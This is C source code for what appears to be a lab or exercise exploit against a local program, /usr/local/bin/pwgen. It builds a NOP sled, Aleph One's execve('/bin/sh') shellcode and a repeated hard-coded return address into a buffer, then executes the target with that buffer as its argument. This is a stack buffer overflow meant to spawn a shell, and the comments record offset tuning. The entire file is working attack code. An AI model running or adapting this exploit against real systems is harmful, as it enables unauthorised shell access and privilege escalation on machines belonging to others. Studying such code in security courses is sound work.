#include <stdio.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/pwgen"

/*
 *  * Aleph One shellcode.
 *
*/
//46
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
      "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char* argv[]){
        char* args[2];
        char* env[1];
        char buffer[1024];
        int i = 0;
        int j = 0;
        int k = 0;
        char ret[] = "\x30\xd7\xbf\xff";

        //segfault when 423
        //474 will give 90 in half of the addr
        for(i = 0; i < 411; i++){
                buffer[i] = '\x90';
                j++;
        }

        for(i = 0; i < strlen(shellcode); i++){
                buffer[j] = shellcode[i];
                j++;
        }

        for(k = 0; k < 10; k++){
                for(i = 0; i < strlen(ret); i++){
                        buffer[j] = ret[i];
                        j++;
                }
        }


        fprintf(stdout, buffer);

        args[0] = buffer;
        args[1] = NULL;

        env[0] = NULL;

        execve(TARGET, args, env);

        fprintf(stdout, "failed\n");

        return 0;
}
